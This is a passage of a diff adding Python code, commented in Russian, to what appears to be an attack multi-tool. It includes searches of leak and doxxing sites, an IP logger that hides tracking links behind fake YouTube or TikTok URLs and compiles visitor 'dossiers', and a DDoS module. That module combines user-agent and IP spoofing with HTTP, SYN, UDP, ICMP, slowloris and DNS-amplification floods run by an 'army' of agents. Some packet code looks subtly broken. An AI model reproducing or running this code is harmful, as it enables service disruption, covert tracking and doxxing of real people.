+                        software[tag_name] = value
+                return software
+            return {}
+        except:
+            return {}
+    
+    def extract_copyright(self):
+        try:
+            from PIL import Image
+            img = Image.open(self.file_path)
+            exif = img._getexif()
+            if exif:
+                for tag, value in exif.items():
+                    if PIL.ExifTags.TAGS.get(tag) == 'Copyright':
+                        return {'copyright': value}
+            return {}
+        except:
+            return {}
+    
+    def extract_author(self):
+        try:
+            from PIL import Image
+            img = Image.open(self.file_path)
+            exif = img._getexif()
+            if exif:
+                for tag, value in exif.items():
+                    if PIL.ExifTags.TAGS.get(tag) == 'Artist':
+                        return {'author': value}
+            return {}
+        except:
+            return {}
+    
+    def extract_title(self):
+        try:
+            from PIL import Image
+            img = Image.open(self.file_path)
+            exif = img._getexif()
+            if exif:
+                for tag, value in exif.items():
+                    if PIL.ExifTags.TAGS.get(tag) == 'DocumentName':
+                        return {'title': value}
+            return {}
+        except:
+            return {}
+    
+    def extract_subject(self):
+        try:
+            from PIL import Image
+            img = Image.open(self.file_path)
+            exif = img._getexif()
+            if exif:
+                for tag, value in exif.items():
+                    if PIL.ExifTags.TAGS.get(tag) == 'ImageDescription':
+                        return {'subject': value}
+            return {}
+        except:
+            return {}
+    
+    def extract_keywords(self):
+        try:
+            from PIL import Image
+            img = Image.open(self.file_path)
+            exif = img._getexif()
+            if exif:
+                for tag, value in exif.items():
+                    if PIL.ExifTags.TAGS.get(tag) == 'Keywords':
+                        return {'keywords': value}
+            return {}
+        except:
+            return {}
+    
+    def extract_comments(self):
+        try:
+            from PIL import Image
+            img = Image.open(self.file_path)
+            exif = img._getexif()
+            if exif:
+                for tag, value in exif.items():
+                    if PIL.ExifTags.TAGS.get(tag) == 'UserComment':
+                        return {'comments': value}
+            return {}
+        except:
+            return {}
+    
+    def extract_thumbnail(self):
+        try:
+            from PIL import Image
+            img = Image.open(self.file_path)
+            if hasattr(img, 'thumbnail'):
+                return {'thumbnail': 'Есть превью'}
+            return {}
+        except:
+            return {}
+
+# ================================================================
+# 7. ПОИСК ПО БАЗАМ ДАННЫХ И СЛИВАМ (LEAKS)
+# ================================================================
+class LeakOSINT:
+    def __init__(self, query):
+        self.query = query
+        self.results = {}
+    
+    def search_all(self):
+        self.results = {
+            'leakcheck': self.search_leakcheck(),
+            'snusbase': self.search_snusbase(),
+            'dehashed': self.search_dehashed(),
+            'scylla': self.search_scylla(),
+            'doxbin': self.search_doxbin(),
+            'pastebin': self.search_pastebin(),
+            'breach': self.search_breach()
+        }
+        return self.results
+    
+    def search_leakcheck(self):
+        try:
+            response = requests.get(f"https://leakcheck.io/api/query?login={self.query}")
+            if response.status_code == 200:
+                data = response.json()
+                if data.get('success'):
+                    return data.get('results', [])
+            return []
+        except:
+            return []
+    
+    def search_snusbase(self):
+        try:
+            return {'error': 'Требуется Snusbase API ключ'}
+        except:
+            return {'error': 'Snusbase недоступен'}
+    
+    def search_dehashed(self):
+        try:
+            return {'error': 'Требуется Dehashed API ключ'}
+        except:
+            return {'error': 'Dehashed недоступен'}
+    
+    def search_scylla(self):
+        try:
+            response = requests.get(f"https://scylla.so/api/search?q={self.query}")
+            if response.status_code == 200:
+                return response.json()
+            return {}
+        except:
+            return {}
+    
+    def search_doxbin(self):
+        try:
+            response = requests.get(f"https://doxbin.com/search?q={self.query}")
+            if response.status_code == 200:
+                soup = BeautifulSoup(response.text, 'html.parser')
+                results = soup.find_all('div', class_='post')
+                return {'count': len(results)}
+            return {}
+        except:
+            return {}
+    
+    def search_pastebin(self):
+        try:
+            response = requests.get(f"https://pastebin.com/search?q={self.query}")
+            if response.status_code == 200:
+                soup = BeautifulSoup(response.text, 'html.parser')
+                results = soup.find_all('div', class_='paste')
+                return {'count': len(results)}
+            return {}
+        except:
+            return {}
+    
+    def search_breach(self):
+        breaches = [
+            'Dropbox', 'LinkedIn', 'Adobe', 'MySpace', 'Yahoo', 'Facebook', 'Twitter', 
+            'Amazon', 'Apple', 'Google', 'Microsoft', 'PayPal', 'eBay', 'WordPress'
+        ]
+        found = []
+        for breach in breaches:
+            try:
+                response = requests.get(f"https://api.pwnedpasswords.com/breaches?q={breach}")
+                if response.status_code == 200:
+                    found.append(breach)
+            except:
+                pass
+        return {'breaches': found}
+
+# ================================================================
+# 8. SHODAN
+# ================================================================
+class ShodanOSINT:
+    def __init__(self, api_key=''):
+        self.api_key = api_key or os.environ.get('SHODAN_API_KEY', '')
+        self.api = None
+        if self.api_key:
+            self.api = shodan.Shodan(self.api_key)
+    
+    def search(self, query):
+        if not self.api:
+            return {'error': 'Требуется API ключ Shodan'}
+        try:
+            results = self.api.search(query)
+            return {
+                'total': results.get('total', 0),
+                'matches': [
+                    {
+                        'ip': match.get('ip_str'),
+                        'port': match.get('port'),
+                        'org': match.get('org'),
+                        'os': match.get('os'),
+                        'banner': match.get('data', '')[:200]
+                    }
+                    for match in results.get('matches', [])
+                ]
+            }
+        except:
+            return {'error': 'Ошибка Shodan'}
+    
+    def host_info(self, ip):
+        if not self.api:
+            return {'error': 'Требуется API ключ Shodan'}
+        try:
+            host = self.api.host(ip)
+            return {
+                'ports': host.get('ports', []),
+                'vulns': host.get('vulns', []),
+                'hostnames': host.get('hostnames', []),
+                'org': host.get('org', ''),
+                'os': host.get('os', ''),
+                'data': host.get('data', [])[:5]
+            }
+        except:
+            return {'error': 'Хост не найден'}
+
+# ================================================================
+# 9. WHOIS
+# ================================================================
+class WhoisOSINT:
+    def __init__(self, target):
+        self.target = target
+    
+    def search(self):
+        try:
+            w = whois.whois(self.target)
+            return {
+                'domain': self.target,
+                'registrar': w.registrar,
+                'creation': str(w.creation_date),
+                'expiration': str(w.expiration_date),
+                'updated': str(w.updated_date),
+                'nameservers': w.name_servers,
+                'status': w.status,
+                'emails': w.emails,
+                'dnssec': w.dnssec
+            }
+        except:
+            return {'error': 'WHOIS недоступен'}
+
+# ================================================================
+# IPLOGGER ULTIMATE
+# ================================================================
+class IPLoggerUltimate:
+    def __init__(self):
+        self.logs = {}
+        self.lock = threading.Lock()
+        self.redirect_services = self._get_services()
+    
+    def _get_services(self) -> List[Dict]:
+        return [
+            {"name": "YouTube", "domain": "youtube.com", "path": "/watch?v=", "icon": "▶️"},
+            {"name": "VK Video", "domain": "vk.com", "path": "/video", "icon": "📹"},
+            {"name": "Rutube", "domain": "rutube.ru", "path": "/video", "icon": "🎬"},
+            {"name": "Dailymotion", "domain": "dailymotion.com", "path": "/video", "icon": "🎥"},
+            {"name": "Vimeo", "domain": "vimeo.com", "path": "/", "icon": "📽️"},
+            {"name": "Bilibili", "domain": "bilibili.com", "path": "/video/", "icon": "📺"},
+            {"name": "Twitch", "domain": "twitch.tv", "path": "/videos/", "icon": "🔴"},
+            {"name": "TikTok", "domain": "tiktok.com", "path": "/@", "icon": "🎵"},
+            {"name": "Instagram Reels", "domain": "instagram.com", "path": "/reels/", "icon": "📸"},
+            {"name": "Facebook Watch", "domain": "facebook.com", "path": "/watch/", "icon": "👀"},
+        ]
+    
+    def _get_geo_by_ip(self, ip: str) -> Dict:
+        geo_data = {
+            "country": "Unknown", "city": "Unknown", "region": "Unknown",
+            "lat": 0, "lon": 0, "isp": "Unknown", "timezone": "Unknown",
+            "org": "Unknown", "asn": "Unknown", "postal": "Unknown",
+            "accuracy": "Unknown", "mobile": False, "proxy": False, "hosting": False
+        }
+        
+        try:
+            response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,regionName,lat,lon,isp,timezone,org,as,zip,mobile,proxy,hosting", timeout=5)
+            if response.status_code == 200:
+                data = response.json()
+                if data.get('status') == 'success':
+                    geo_data.update({
+                        "country": data.get('country', 'Unknown'),
+                        "city": data.get('city', 'Unknown'),
+                        "region": data.get('regionName', 'Unknown'),
+                        "lat": data.get('lat', 0),
+                        "lon": data.get('lon', 0),
+                        "isp": data.get('isp', 'Unknown'),
+                        "timezone": data.get('timezone', 'Unknown'),
+                        "org": data.get('org', 'Unknown'),
+                        "asn": data.get('as', 'Unknown'),
+                        "postal": data.get('zip', 'Unknown'),
+                        "mobile": data.get('mobile', False),
+                        "proxy": data.get('proxy', False),
+                        "hosting": data.get('hosting', False),
+                    })
+        except:
+            pass
+        
+        try:
+            response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
+            if response.status_code == 200:
+                data = response.json()
+                geo_data.update({
+                    "country": data.get('country', geo_data['country']),
+                    "city": data.get('city', geo_data['city']),
+                    "region": data.get('region', geo_data['region']),
+                    "org": data.get('org', geo_data['org']),
+                })
+        except:
+            pass
+        
+        return geo_data
+    
+    def _detect_device(self, ua: str) -> Dict:
+        ua = ua.lower()
+        device = {
+            "type": "Desktop", "os": "Unknown", "browser": "Unknown",
+            "version": "Unknown", "mobile": False, "tablet": False
+        }
+        
+        if "mobile" in ua or "android" in ua or "iphone" in ua:
+            device["type"] = "Mobile"
+            device["mobile"] = True
+        elif "tablet" in ua or "ipad" in ua:
+            device["type"] = "Tablet"
+            device["tablet"] = True
+        
+        if "windows" in ua:
+            device["os"] = "Windows"
+        elif "mac" in ua or "apple" in ua:
+            device["os"] = "macOS"
+        elif "linux" in ua:
+            device["os"] = "Linux"
+        elif "android" in ua:
+            device["os"] = "Android"
+        elif "iphone" in ua or "ios" in ua:
+            device["os"] = "iOS"
+        
+        if "chrome" in ua and "edge" not in ua:
+            device["browser"] = "Chrome"
+        elif "firefox" in ua:
+            device["browser"] = "Firefox"
+        elif "safari" in ua and "chrome" not in ua:
+            device["browser"] = "Safari"
+        elif "edge" in ua:
+            device["browser"] = "Edge"
+        elif "opera" in ua:
+            device["browser"] = "Opera"
+        
+        return device
+    
+    def create_logger(self, video_url: str, redirect_url: str = None, expire_hours: int = 24) -> Dict:
+        logger_id = hashlib.md5(f"{video_url}{time.time()}{random.random()}{os.urandom(16)}".encode()).hexdigest()[:12]
+        service = random.choice(self.redirect_services)
+        video_id = "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 15)))
+        masked_url = f"https://{service['domain']}{service['path']}{video_id}"
+        short_id = hashlib.md5(logger_id.encode()).hexdigest()[:6]
+        short_url = f"https://iplogger.link/{short_id}"
+        
+        if not redirect_url:
+            redirect_url = video_url
+        
+        log_data = {
+            "id": logger_id,
+            "video_url": video_url,
+            "redirect_url": redirect_url,
+            "masked_url": masked_url,
+            "short_url": short_url,
+            "service": service,
+            "created_at": time.time(),
+            "expire_at": time.time() + (expire_hours * 3600),
+            "hits": [],
+            "total_hits": 0,
+            "unique_ips": set(),
+            "unique_visitors": {},
+            "countries": {},
+            "cities": {},
+            "devices": {},
+            "browsers": {},
+            "oss": {},
+            "last_hit": None
+        }
+        
+        with self.lock:
+            self.logs[logger_id] = log_data
+        
+        return {
+            "id": logger_id,
+            "masked_url": masked_url,
+            "short_url": short_url,
+            "redirect_url": redirect_url,
+            "service": service['name'],
+            "expire": expire_hours
+        }
+    
+    def log_hit(self, logger_id: str, request_data: Dict) -> Dict:
+        with self.lock:
+            if logger_id not in self.logs:
+                return {"error": "Logger not found"}
+            
+            log = self.logs[logger_id]
+            
+            if time.time() > log["expire_at"]:
+                return {"error": "Logger expired"}
+            
+            ip = request_data.get("ip", "0.0.0.0")
+            ua = request_data.get("user_agent", "Unknown")
+            
+            geo = self._get_geo_by_ip(ip)
+            device = self._detect_device(ua)
+            
+            timestamp = time.time()
+            dt = datetime.datetime.fromtimestamp(timestamp)
+            
+            hit = {
+                "timestamp": timestamp,
+                "datetime": dt.strftime("%Y-%m-%d %H:%M:%S"),
+                "ip": ip,
+                "user_agent": ua,
+                "device": device,
+                "geo": geo,
+                "referer": request_data.get("referer", ""),
+                "language": request_data.get("language", ""),
+            }
+            
+            log["hits"].append(hit)
+            log["total_hits"] += 1
+            log["unique_ips"].add(ip)
+            log["last_hit"] = timestamp
+            
+            country = geo.get("country", "Unknown")
+            log["countries"][country] = log["countries"].get(country, 0) + 1
+            
+            city = geo.get("city", "Unknown")
+            log["cities"][city] = log["cities"].get(city, 0) + 1
+            
+            device_type = device.get("type", "Unknown")
+            log["devices"][device_type] = log["devices"].get(device_type, 0) + 1
+            
+            browser = device.get("browser", "Unknown")
+            log["browsers"][browser] = log["browsers"].get(browser, 0) + 1
+            
+            os_type = device.get("os", "Unknown")
+            log["oss"][os_type] = log["oss"].get(os_type, 0) + 1
+            
+            visitor_key = f"{ip}_{device.get('browser', 'Unknown')}"
+            if visitor_key not in log["unique_visitors"]:
+                log["unique_visitors"][visitor_key] = {
+                    "first_seen": timestamp,
+                    "last_seen": timestamp,
+                    "count": 1,
+                    "ip": ip,
+                    "device": device,
+                    "geo": geo
+                }
+            else:
+                log["unique_visitors"][visitor_key]["last_seen"] = timestamp
+                log["unique_visitors"][visitor_key]["count"] += 1
+            
+            return hit
+    
+    def get_stats(self, logger_id: str) -> Dict:
+        with self.lock:
+            if logger_id not in self.logs:
+                return {"error": "Logger not found"}
+            
+            log = self.logs[logger_id]
+            
+            return {
+                "id": log["id"],
+                "total_hits": log["total_hits"],
+                "unique_ips": len(log["unique_ips"]),
+                "unique_visitors": len(log["unique_visitors"]),
+                "countries": log["countries"],
+                "cities": log["cities"],
+                "devices": log["devices"],
+                "browsers": log["browsers"],
+                "oss": log["oss"],
+                "hits": log["hits"][-20:],
+                "created_at": log["created_at"],
+                "expire_at": log["expire_at"],
+                "redirect_url": log["redirect_url"],
+                "masked_url": log["masked_url"],
+                "short_url": log["short_url"],
+                "last_hit": log["last_hit"]
+            }
+    
+    def get_full_dossier(self, logger_id: str) -> Dict:
+        with self.lock:
+            if logger_id not in self.logs:
+                return {"error": "Logger not found"}
+            
+            log = self.logs[logger_id]
+            
+            ips = {}
+            devices = {}
+            countries = {}
+            cities = {}
+            browsers = {}
+            oss = {}
+            time_of_day = {"morning": 0, "afternoon": 0, "evening": 0, "night": 0}
+            
+            for hit in log["hits"]:
+                ip = hit.get("ip", "0.0.0.0")
+                ips[ip] = ips.get(ip, 0) + 1
+                
+                device = hit.get("device", {}).get("type", "Unknown")
+                devices[device] = devices.get(device, 0) + 1
+                
+                geo = hit.get("geo", {})
+                country = geo.get("country", "Unknown")
+                countries[country] = countries.get(country, 0) + 1
+                
+                city = geo.get("city", "Unknown")
+                cities[city] = cities.get(city, 0) + 1
+                
+                browser = hit.get("device", {}).get("browser", "Unknown")
+                browsers[browser] = browsers.get(browser, 0) + 1
+                
+                os_type = hit.get("device", {}).get("os", "Unknown")
+                oss[os_type] = oss.get(os_type, 0) + 1
+                
+                dt = datetime.datetime.fromtimestamp(hit.get("timestamp", 0))
+                hour = dt.hour
+                if 6 <= hour < 12:
+                    time_of_day["morning"] += 1
+                elif 12 <= hour < 18:
+                    time_of_day["afternoon"] += 1
+                elif 18 <= hour < 23:
+                    time_of_day["evening"] += 1
+                else:
+                    time_of_day["night"] += 1
+            
+            return {
+                "id": log["id"],
+                "video_url": log["video_url"],
+                "redirect_url": log["redirect_url"],
+                "masked_url": log["masked_url"],
+                "short_url": log["short_url"],
+                "service": log["service"],
+                "total_hits": log["total_hits"],
+                "unique_ips": len(log["unique_ips"]),
+                "unique_visitors": len(log["unique_visitors"]),
+                "ips": ips,
+                "devices": devices,
+                "countries": countries,
+                "cities": cities,
+                "browsers": browsers,
+                "oss": oss,
+                "time_of_day": time_of_day,
+                "all_hits": log["hits"],
+                "created_at": log["created_at"],
+                "expire_at": log["expire_at"],
+                "last_hit": log["last_hit"],
+                "is_expired": time.time() > log["expire_at"]
+            }
+    
+    def generate_dossier_files(self, logger_id: str) -> Tuple[str, str]:
+        dossier = self.get_full_dossier(logger_id)
+        if "error" in dossier:
+            return None, None
+        
+        filename = f"dossier_{logger_id}_{int(time.time())}"
+        json_path = os.path.join(TEMP_FOLDER, "dossiers", f"{filename}.json")
+        txt_path = os.path.join(TEMP_FOLDER, "dossiers", f"{filename}.txt")
+        
+        with open(json_path, 'w', encoding='utf-8') as f:
+            json.dump(dossier, f, indent=2, ensure_ascii=False)
+        
+        with open(txt_path, 'w', encoding='utf-8') as f:
+            f.write("=" * 60 + "\n")
+            f.write(f"   ДОСЬЕ ЛОГГЕРА {logger_id}\n")
+            f.write("=" * 60 + "\n\n")
+            
+            f.write(f"🆔 ID: {dossier['id']}\n")
+            f.write(f"📹 Сервис: {dossier['service']['name']}\n")
+            f.write(f"🔗 Маскированная ссылка: {dossier['masked_url']}\n")
+            f.write(f"🔗 Короткая ссылка: {dossier['short_url']}\n")
+            f.write(f"🔗 Редирект: {dossier['redirect_url']}\n")
+            f.write(f"📅 Создан: {time.ctime(dossier['created_at'])}\n")
+            f.write(f"⏰ Истекает: {time.ctime(dossier['expire_at'])}\n")
+            f.write(f"📊 Всего переходов: {dossier['total_hits']}\n")
+            f.write(f"👤 Уникальных IP: {dossier['unique_ips']}\n")
+            f.write(f"👥 Уникальных посетителей: {dossier['unique_visitors']}\n")
+            f.write(f"🔄 Статус: {'ИСТЕК' if dossier['is_expired'] else 'АКТИВЕН'}\n\n")
+            
+            f.write("-" * 60 + "\n")
+            f.write("  СТАТИСТИКА ПО СТРАНАМ\n")
+            f.write("-" * 60 + "\n")
+            for country, count in sorted(dossier['countries'].items(), key=lambda x: x[1], reverse=True):
+                f.write(f"  {country}: {count} переходов\n")
+            
+            f.write("\n" + "-" * 60 + "\n")
+            f.write("  СТАТИСТИКА ПО ГОРОДАМ\n")
+            f.write("-" * 60 + "\n")
+            for city, count in sorted(dossier['cities'].items(), key=lambda x: x[1], reverse=True)[:10]:
+                f.write(f"  {city}: {count} переходов\n")
+            
+            f.write("\n" + "-" * 60 + "\n")
+            f.write("  СТАТИСТИКА ПО УСТРОЙСТВАМ\n")
+            f.write("-" * 60 + "\n")
+            for device, count in dossier['devices'].items():
+                f.write(f"  {device}: {count} переходов ({count/dossier['total_hits']*100:.1f}%)\n")
+            
+            f.write("\n" + "-" * 60 + "\n")
+            f.write("  СТАТИСТИКА ПО БРАУЗЕРАМ\n")
+            f.write("-" * 60 + "\n")
+            for browser, count in dossier['browsers'].items():
+                f.write(f"  {browser}: {count} переходов\n")
+            
+            f.write("\n" + "-" * 60 + "\n")
+            f.write("  СТАТИСТИКА ПО ОС\n")
+            f.write("-" * 60 + "\n")
+            for os_type, count in dossier['oss'].items():
+                f.write(f"  {os_type}: {count} переходов\n")
+            
+            f.write("\n" + "-" * 60 + "\n")
+            f.write("  ВРЕМЯ ПОСЕЩЕНИЙ\n")
+            f.write("-" * 60 + "\n")
+            for period, count in dossier['time_of_day'].items():
+                f.write(f"  {period.capitalize()}: {count} переходов\n")
+            
+            f.write("\n" + "=" * 60 + "\n")
+            f.write("  ПОСЛЕДНИЕ 20 ПОСЕЩЕНИЙ\n")
+            f.write("=" * 60 + "\n\n")
+            
+            for hit in dossier['all_hits'][-20:]:
+                f.write(f"📅 {hit.get('datetime', 'Unknown')}\n")
+                f.write(f"   IP: {hit.get('ip', '0.0.0.0')}\n")
+                f.write(f"   📍 {hit.get('geo', {}).get('country', 'Unknown')}, {hit.get('geo', {}).get('city', 'Unknown')}\n")
+                f.write(f"   📱 {hit.get('device', {}).get('type', 'Unknown')} | {hit.get('device', {}).get('os', 'Unknown')} | {hit.get('device', {}).get('browser', 'Unknown')}\n")
+                f.write(f"   🌐 {hit.get('user_agent', 'Unknown')[:100]}...\n\n")
+            
+            f.write("=" * 60 + "\n")
+            f.write("  КОНЕЦ ДОСЬЕ\n")
+            f.write("=" * 60 + "\n")
+        
+        return json_path, txt_path
+
+# ================================================================
+# DDOS МОДУЛЬ
+# ================================================================
+class AntiDetection:
+    def __init__(self):
+        self.user_agents = self._generate_user_agents()
+        self.headers = self._generate_headers()
+    
+    def _generate_user_agents(self) -> List[str]:
+        agents = []
+        os_list = [
+            "Windows NT 10.0; Win64; x64",
+            "Windows NT 10.0; WOW64",
+            "Windows NT 6.1; Win64; x64",
+            "Windows NT 6.3; Win64; x64",
+            "Macintosh; Intel Mac OS X 10_15_7",
+            "Macintosh; Intel Mac OS X 11_6",
+            "Macintosh; Intel Mac OS X 12_4",
+            "X11; Linux x86_64",
+            "X11; Ubuntu; Linux x86_64",
+            "X11; Fedora; Linux x86_64",
+        ]
+        
+        browsers = [
+            ("Chrome", 90, 120),
+            ("Firefox", 88, 118),
+            ("Safari", 60, 70),
+            ("Edge", 90, 120),
+            ("Opera", 70, 95),
+            ("Brave", 10, 30),
+        ]
+        
+        for _ in range(200):
+            for os_str in os_list:
+                for browser, min_ver, max_ver in browsers:
+                    version = random.randint(min_ver, max_ver)
+                    build = random.randint(1000, 9999)
+                    patch = random.randint(0, 999)
+                    webkit = random.randint(530, 538)
+                    ua = f"Mozilla/5.0 ({os_str}) AppleWebKit/{webkit}.{random.randint(10,40)} (KHTML, like Gecko) {browser}/{version}.{build}.{patch} Safari/{webkit}.{random.randint(10,40)}"
+                    agents.append(ua)
+        return agents
+    
+    def _generate_headers(self) -> Dict[str, str]:
+        return {
+            "Accept": random.choice([
+                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "application/json, text/plain, */*",
+                "application/xml, text/xml, */*",
+            ]),
+            "Accept-Language": random.choice([
+                "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
+                "en-US,en;q=0.9,ru;q=0.8",
+                "en-GB,en;q=0.9,ru;q=0.8",
+            ]),
+            "Accept-Encoding": random.choice([
+                "gzip, deflate, br",
+                "gzip, deflate",
+                "gzip, br",
+            ]),
+            "DNT": "1",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+            "Cache-Control": random.choice(["max-age=0", "no-cache", "no-store"]),
+        }
+
+anti_detect = AntiDetection()
+
+class DDoSAgent:
+    def __init__(self, agent_id: int, target: str):
+        self.agent_id = agent_id
+        self.target = target
+        self.running = True
+        self.packets_sent = 0
+        self.bytes_sent = 0
+        self.start_time = time.time()
+        self.ip_spoof = self._generate_spoof_ip()
+        self.session = None
+        self.sockets = []
+        self.attack_counter = 0
+        self.thread = None
+    
+    def _generate_spoof_ip(self) -> str:
+        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+    
+    def init_session(self):
+        self.session = requests.Session()
+        self.session.headers.update(anti_detect.headers)
+        self.session.headers["User-Agent"] = random.choice(anti_detect.user_agents)
+        self.session.headers["X-Forwarded-For"] = self.ip_spoof
+        self.session.headers["X-Real-IP"] = self.ip_spoof
+        self.session.headers["X-Client-IP"] = self.ip_spoof
+        
+        for _ in range(20):
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.settimeout(0.05)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            self.sockets.append(sock)
+    
+    def attack(self):
+        self.init_session()
+        
+        attack_functions = [
+            self.http_flood,
+            self.syn_flood,
+            self.udp_flood,
+            self.icmp_flood,
+            self.slowloris,
+            self.dns_amplification,
+            self.ping_of_death,
+        ]
+        
+        while self.running:
+            for attack in attack_functions:
+                try:
+                    attack()
+                    self.attack_counter += 1
+                except:
+                    pass
+    
+    def http_flood(self):
+        if not self.session:
+            return
+        
+        parsed = urllib.parse.urlparse(self.target)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+        
+        paths = ["/", "/index", "/admin", "/api", "/login", "/wp-admin", "/.env", "/config"]
+        methods = ["GET", "POST", "HEAD", "OPTIONS"]
+        
+        for _ in range(random.randint(5, 20)):
+            method = random.choice(methods)
+            path = random.choice(paths)
+            
+            params = {
+                'cache_buster': str(random.randint(0, 2**32-1)),
+                '_': str(time.time()),
+            }
+            
+            body = None
+            if method in ["POST"]:
+                body = json.dumps({f"field_{i}": ''.join(random.choices(string.ascii_letters + string.digits, k=500)) for i in range(20)})
+            
+            headers = {
+                "User-Agent": random.choice(anti_detect.user_agents),
+                "X-Forwarded-For": self.ip_spoof,
+                "X-Real-IP": self.ip_spoof,
+                "X-Client-IP": self.ip_spoof,
+                "Referer": f"http://{random.choice(['google.com','bing.com','yahoo.com'])}/search?q={''.join(random.choices(string.ascii_lowercase, k=10))}",
+            }
+            
+            try:
+                if method == "GET":
+                    resp = self.session.get(f"{base_url}{path}", params=params, headers=headers, timeout=0.3)
+                elif method == "POST":
+                    resp = self.session.post(f"{base_url}{path}", params=params, data=body, headers=headers, timeout=0.3)
+                else:
+                    resp = self.session.head(f"{base_url}{path}", params=params, headers=headers, timeout=0.3)
+                
+                self.packets_sent += 1
+                self.bytes_sent += len(resp.content) if resp.content else 0
+                resp.close()
+            except:
+                pass
+    
+    def syn_flood(self):
+        if not self.sockets:
+            return
+        
+        for sock in self.sockets[:5]:
+            try:
+                dst_port = random.randint(1, 65535)
+                seq = random.randint(0, 2**32-1)
+                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                
+                packet = struct.pack('!BBHHLLBBH',
+                    0x45, 0x00, 40, 0, 0x4000, 0x40, 6, 0,
+                    socket.inet_aton(src_ip), socket.inet_aton("127.0.0.1"),
+                    random.randint(1024, 65535), dst_port, seq, 0, 0x5010, 0x0000
+                )
+                
+                sock.sendto(packet, ("127.0.0.1", dst_port))
+                self.packets_sent += 1
+            except:
+                pass
+    
+    def udp_flood(self):
+        if not self.sockets:
+            return
+        
+        for sock in self.sockets[:5]:
+            try:
+                dst_port = random.randint(1, 65535)
+                data = os.urandom(random.randint(64, 65507))
+                sock.sendto(data, ("127.0.0.1", dst_port))
+                self.packets_sent += 1
+            except:
+                pass
+    
+    def icmp_flood(self):
+        if not self.sockets:
+            return
+        
+        for sock in self.sockets[:3]:
+            try:
+                type_ = 8
+                code = 0
+                identifier = random.randint(0, 65535)
+                sequence = random.randint(0, 65535)
+                data = os.urandom(random.randint(8, 1024))
+                
+                packet = struct.pack('!BBHHH', type_, code, 0, identifier, sequence) + data
+                checksum = self._calculate_checksum(packet)
+                packet = struct.pack('!BBHHH', type_, code, checksum, identifier, sequence) + data
+                
+                sock.sendto(packet, ("127.0.0.1", 0))
+                self.packets_sent += 1
+            except:
+                pass
+    
+    def slowloris(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.3)
+            sock.connect(("127.0.0.1", 80))
+            
+            headers = [
+                f"GET /{''.join(random.choices(string.ascii_lowercase, k=10))} HTTP/1.1\r\n",
+                f"Host: target.com\r\n",
+                f"User-Agent: {random.choice(anti_detect.user_agents)}\r\n",
+                f"X-Forwarded-For: {self.ip_spoof}\r\n",
+                f"X-Real-IP: {self.ip_spoof}\r\n",
+            ]
+            
+            for header in headers:
+                sock.send(header.encode())
+                time.sleep(random.uniform(0.05, 0.2))
+            
+            start = time.time()
+            while self.running and time.time() - start < 60:
+                sock.send(f"X-Idle: {random.randint(1,999999)}\r\n".encode())
+                time.sleep(random.uniform(5, 15))
+            
+            sock.close()
+        except:
+            pass
+    
+    def dns_amplification(self):
+        if not self.sockets:
+            return
+        
+        for sock in self.sockets[:3]:
+            try:
+                domain = f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(5,15)))}.com"
+                dns_query = self._build_dns_query(domain)
+                sock.sendto(dns_query, ("8.8.8.8", 53))
+                self.packets_sent += 1
+            except:
+                pass
+    
+    def ping_of_death(self):
+        if not self.sockets:
+            return
+        
+        for sock in self.sockets[:3]:
+            try:
+                data = os.urandom(65507)
+                packet = struct.pack('!BBHHH', 8, 0, 0, random.randint(0,65535), random.randint(0,65535)) + data
+                checksum = self._calculate_checksum(packet)
+                packet = struct.pack('!BBHHH', 8, 0, checksum, random.randint(0,65535), random.randint(0,65535)) + data
+                
+                sock.sendto(packet, ("127.0.0.1", 0))
+                self.packets_sent += 1
+            except:
+                pass
+    
+    def _build_dns_query(self, domain: str) -> bytes:
+        transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
+        flags = 0x0100.to_bytes(2, 'big')
+        questions = 0x0001.to_bytes(2, 'big')
+        answer_rr = 0x0000.to_bytes(2, 'big')
+        authority_rr = 0x0000.to_bytes(2, 'big')
+        additional_rr = 0x0000.to_bytes(2, 'big')
+        
+        name_parts = domain.split('.')
+        name_bytes = b''
+        for part in name_parts:
+            name_bytes += len(part).to_bytes(1, 'big') + part.encode()
+        name_bytes += b'\x00'
+        
+        qtype = 0x0001.to_bytes(2, 'big')
+        qclass = 0x0001.to_bytes(2, 'big')
+        
+        return transaction_id + flags + questions + answer_rr + authority_rr + additional_rr + name_bytes + qtype + qclass
+    
+    def _calculate_checksum(self, data: bytes) -> int:
+        if len(data) % 2 != 0:
+            data += b'\x00'
+        checksum = 0
+        for i in range(0, len(data), 2):
+            checksum += (data[i] << 8) + data[i+1]
+        checksum = (checksum >> 16) + (checksum & 0xFFFF)
+        checksum += checksum >> 16
+        return ~checksum & 0xFFFF
+    
+    def stop(self):
+        self.running = False
+        if self.session:
+            try:
+                self.session.close()
+            except:
+                pass
+        for sock in self.sockets:
+            try:
+                sock.close()
+            except:
+                pass
+        self.sockets = []
+
+class DDoSOrchestrator:
+    def __init__(self, target: str, agents_count: int = 10000):
+        self.target = target
+        self.agents_count = agents_count
+        self.agents = []
+        self.running = True
+        self.stats = {
+            'total_packets': 0,
+            'total_bytes': 0,
+            'active_agents': 0,
+            'start_time': time.time(),
+            'agents_created': 0,
+            'peak_pps': 0,
+        }
+        self.lock = threading.Lock()
+        self.thread_pool = ThreadPoolExecutor(max_workers=multiprocessing.cpu_count() * 4)
+    
+    def create_army(self):
+        print(f"[*] Creating army of {self.agents_count:,} agents...")
+        
+        batch_size = 10000
+        for i in range(0, self.agents_count, batch_size):
+            end = min(i + batch_size, self.agents_count)
+            print(f"[*] Creating agents {i:,} - {end:,}...")
+            
+            for j in range(i, end):
+                agent = DDoSAgent(j, self.target)
